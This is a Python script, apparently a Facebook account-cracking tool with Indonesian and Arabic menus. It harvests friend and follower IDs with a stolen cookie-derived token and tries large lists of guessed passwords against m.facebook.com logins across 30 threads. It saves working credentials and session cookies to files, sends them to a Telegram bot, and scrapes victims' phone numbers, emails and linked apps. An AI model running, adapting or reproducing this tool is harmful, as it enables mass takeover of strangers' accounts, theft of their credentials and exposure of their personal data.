Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G960F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810Y Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J600FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9.0.0; en-au; SAMSUNG SM-GT9001 Build/R18NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36']
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ marton]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ marton ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ marton ]---------------#

def SMVIP():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()


def login_lagi334():
	try:
		
		asu = random.choice([m,k,h,b,u])
		os.system('clear')
		cookie=input(f'  [{h}•{x}]Koki :{asu} ')
		open(".cok.txt", "w").write(cookie)
		with requests.Session() as rsn:
			try:
				rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open(".token.txt", "w").write(token)
					print('%sLogin Succes%s'%(h, p))

				else:
					print('%sFailled Get Token%s'%(m, p))

			except:
				print('Failled Get Token')

		print(f'  {x}[{h}•{x}]{h} Berhasil Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
		print(e)
		exit()
def bot():
	try:
		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
def menu(my_name,my_id):
    os.system('clear')
    print('')
    
    print('''
────────────────────────────────────────────────────────────\n\x1b[1;32m(\x1b[1;35m+\x1b[1;32m) \x1b[1;33m Telegram\x1b[1;35m | \x1b[1;32m @tere_2 \x1b[1;35m (\x1b[1;32m+\x1b[1;35m) \x1b[1;33m Telegram \x1b[1;35m | \x1b[1;32m@TimVlP_SM\n\x1b[1;────────────────────────────────────────────────────────────   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ''')
    print(f" {a16}{a2}☽الــقــائــمة☾")
    print('\x1b[82m'+'━'*60)
    print('')
    print(a32+'▭▬'*25)
    print(a36+a2+' 1. Crack Publik ➪ من الاصدقاء ')
    print(a32+'▭▬'*25)
    print(a36+a2+' 2. Crack File ➪ من ملف ')
    print(a32+'▭▬'*25)
    print(a20+a2+' 0. login out ➪ تغيير الكوكيز     ')
    print(a32+'▭▬'*25)
    _____alvino__adijaya_____ = input('\n>> chose : ')
    if _____alvino__adijaya_____ in ['1']:
        dump_massal()
    elif _____alvino__adijaya_____ in ['2']:
	    TakeFile()	
    elif _____alvino__adijaya_____ in ['0']:
       oss()
def oss():
	import os
	os.system('rm -rf .token.txt')
	os.system('rm -rf .cookie.txt')
	print('Done')
	exit()
	
	
def follower():
	
	try:
		jum = int(input('[>>] CRACK ID LIMIT : اكتب عدد الايديات '))
	except ValueError:
		print('{k}[✖] NOT PUBLIC ID ')
		time.sleep(3)
		follower()
	if jum<1:
		print('[✖] Your limit error')
		time.sleep(3)
		follower()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1		
		kl = input('[*] ID >> '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			koh2 = ses.get('https://graph.facebook.com/'+userr+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
			for pi in koh2['subscribers']['data']:
				try:id.append(pi['id']+'|'+pi['name'])
				except:continue
			print('[>>] Total Id : '+str(len(id)))
			setting()
		except requests.exceptions.ConnectionError:
			print('[✖] No Connection  ')
			exit()
		except (KeyError,IOError):
			print('[✘] Id Is Not Public')
			time.sleep(3)
			follower()

def TakeFile():
	
	try:
		
		jum = input('[?] INPUT FILE : ')
		for line in open(jum, 'r').readlines():
			id.append(line.strip())
		print('[•] Total Id : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
			print('[✘] No Connection  ')
			exit()
	except (KeyError,IOError):
			print('[✘] Id Is Not Public')
			time.sleep(3)
			follower()

def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		kumpulkan = int(input(f'how many ids:'))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>100:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'id'+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = ({"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Windows NT 6.2; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Safari/537.36"})
	       if len(id) == 0:
	           params = ({'access_token': token,'fields': "friends"})
	       else:
	           params = ({'access_token': token,'fields': "friends"})
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	    	exit()

	try:
		print(f'TOTAL ID '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'')

def setting():
	print(a16+'▭▬'*30)
	print(f'» 1- 𝐈𝐃 𝐎𝐋𝐃 | فحص ايـديـات قـديـم')
	print('» 2- 𝐈𝐃 𝐍𝐄𝐖 | فحص ايـديـات جـديـد')
	print('» 3- 𝐎𝐋𝐃+𝐍𝐄𝐖 | قـديـمـه وجـديده ')
	print(a16+'▭▬'*30)
	print('')
	hu = input(' Chose : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> PILIH YANG BENAR BANG ')
		exit()
	print('>> 1. Mobile ')
#    print('>> 2. Mbasic ')
#    print('>> 3. Touch  ')
#    print('>> 4. Mtouch ')
	print('')
	hc = input('» Chose : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['']:
		print('>> PILIH YANG BENAR BANG ')
		setting()
#	elif hc in ['2','02']:
#		method.append('free')
#	elif hc in ['3','03']:
#		method.append('touch')
	elif hc in ['4','04']:
		method.append('mbasic')
	else:
		method.append('mobile')
	print('')
	_jembot_ = input('>> Add App : اظهار التطبيقات المرتبطه ( Y/t ) ')
	if _jembot_ in ['']:
		print('>> Pilih Yang Bener Kontol ')
		back()
	elif _jembot_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	pwplus=input('>> Password Manual : باسورد يدوي (T عشوائي)( Y/t ) ')
	print(a16+'▭▬'*30)
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
		pwku=input('>> Masukkan Password Tambahan : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
		
	passwrd() 
def passwrd():
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append('19991999')
					pwv.append('19981998')
					pwv.append('19971997')
					pwv.append('19961996')
					pwv.append('19951995')
					pwv.append('19941994')
					pwv.append('19931993')
					pwv.append('19921992')
					pwv.append('19901990')
					pwv.append('19911991')
					pwv.append('zzxxccvv')
					pwv.append('mmnnbbvv')
					pwv.append('qqwweerrtt')
					pwv.append('12345qwert')
					pwv.append('aassddff')
					pwv.append('qqqqwwww')
					pwv.append('zxcvzxcv')
					pwv.append('oooopppp')
					pwv.append('qwertyuiopasdfghjkl')
					pwv.append('nnnnmmmm')
					pwv.append('firstfirst')
					pwv.append('first first')
					pwv.append('1q2w3e4r5t')
					pwv.append('first last')
					pwv.append('12345@@@@@')
					pwv.append('mmmmnnnn')
					pwv.append('1020304050')
					pwv.append('5432154321')
					pwv.append('qqwweerrttyy')
					pwv.append('10203040')
					pwv.append('zzxxcczzxxcc')
					pwv.append('1234567890')
					pwv.append('1234@@@@')
					pwv.append('20012001')
					pwv.append('1234qwer')
					pwv.append('zzzzxxxx')
					pwv.append('qwertyuiop')
					pwv.append('20232023')
					pwv.append('20222022')
					pwv.append('20212021')
					pwv.append('20202020')
					pwv.append('123456789')
					pwv.append('123456')
					pwv.append('10203040')
					pwv.append('1020304050')
					pwv.append('١٢٣٤٥٦٧٨٩٠')
					pwv.append('1234512345')
					pwv.append('123456123456')
					pwv.append('5544332211')
					pwv.append('1122334455@@')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append('00998877')
					pwv.append('112233445566')
					pwv.append('1122334455')
					pwv.append('aaaassss')
					pwv.append('07800780')
					pwv.append('11223344@@')
					pwv.append('qqwweerr')
					pwv.append('1234554321')
					pwv.append('1122334455')
					pwv.append('123456654321')
					pwv.append('20032003')
					pwv.append('ppooiiuu')
					pwv.append('07700770')
					pwv.append('0099887766')
					pwv.append('20032003')
					pwv.append('١٢٣٤٥٦')
					pwv.append('١٢٣٤٥٦٧٨٩')
					pwv.append('12345@12345')
					pwv.append('12345@')
					pwv.append('1q2w3e4r5t6y')
					pwv.append('11223344556677')
					pwv.append('20052005')
					pwv.append('20042004')
					pwv.append('20002000')
					pwv.append('qqwweerr')
					pwv.append('aaaassss')
					
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('>> Lanjut Crack Kembali ( Y/t ) ? ')
	woi = input('>> Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}[=]{k} Been completed {x} <> ')
		time.sleep(2)
		
		exit()		
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	rc = random.choice
	amr = rc([''])
	sys.stdout.write(f"\r{bo}({amr} SM• martin) {loop}•{len(id)}  • OK:{ok} •  CP:{cp} • ({'{:.0%}'.format(loop/float(len(id)))}{amr})"),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host": 'm.facebook.com', "upgrade-insecure-requests": "1", "user-agent": ua2,
                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                                "dnt": "1", "x-requested-with": "mark.via.gp", "sec-fetch-site": "same-origin",
                                "sec-fetch-mode": "cors", "sec-fetch-user": "empty", "sec-fetch-dest": "document",
                                "referer": "https://m.facebook.com/", "accept-encoding": "gzip, deflate br",
                                "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\n')
				
					statuscp = f''''⪧ ❲martin  • CP ❳
\n❰▭▬▭▬▭▬﹝مارتن﹞▭▬▭▬▭▬❱
\n  SM  \n- 𝐈𝐃 𖡲 : {idf}\n
 
\n SM   \n- 𝗣𝗔𝗦𝗦 ッ \n :{pw}

\nSM  \n - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 :  ッ \n:{kuki}
\n❰▭▬▭▬▭▬﹝𝐎𝐊﹞▭▬▭▬▭▬❱
(SM • martin)  :  @tere_2'\n\n\t\t\t\t\t
					'''
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='SESI'))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statuscp))
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')

					statusok = f'''⪧ ❲martin  • OK ❳
\n❰▭▬▭▬▭▬﹝مارتن﹞▭▬▭▬▭▬❱
\n  SM  \n- 𝐈𝐃 𖡲 : {idf}\n
 
\n SM   \n- 𝗣𝗔𝗦𝗦 ッ \n :{pw}

\nSM  \n - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 :  ッ \n:{kuki}
\n❰▭▬▭▬▭▬﹝𝐎𝐊﹞▭▬▭▬▭▬❱
(SM • martin)  :  @tere_2'\n\n\t\t\t\t\t
					'''
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK'))
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
					cek_SMVIP(kuki)
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass


					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))

					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f"Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
							for muncul in apkKadaluarsa:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
								hit2+=1
					else:pass
					print('\n')
					statusok = f'''⪧ ❲martin  • OK ❳
\n❰▭▬▭▬▭▬﹝مارتن﹞▭▬▭▬▭▬❱
\n  SM  \n- 𝐈𝐃 𖡲 : {idf}\n
 
\n SM   \n- 𝗣𝗔𝗦𝗦 ッ \n :{pw}

\nSM  \n - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 :  ッ \n:{kuki}
\n❰▭▬▭▬▭▬﹝𝐎𝐊﹞▭▬▭▬▭▬❱
(SM • martin)  :  @tere_2'\n\n\t\t\t\t\t'''
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK'))
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
					cek_SMVIP(kuki)
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def cek_SMVIP(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:	 
		print ("\r    %s \033[0mcookie invalid"%(M))
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/ALVINO-DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('clear')
	except:pass
	
	SMVIP()
	
	
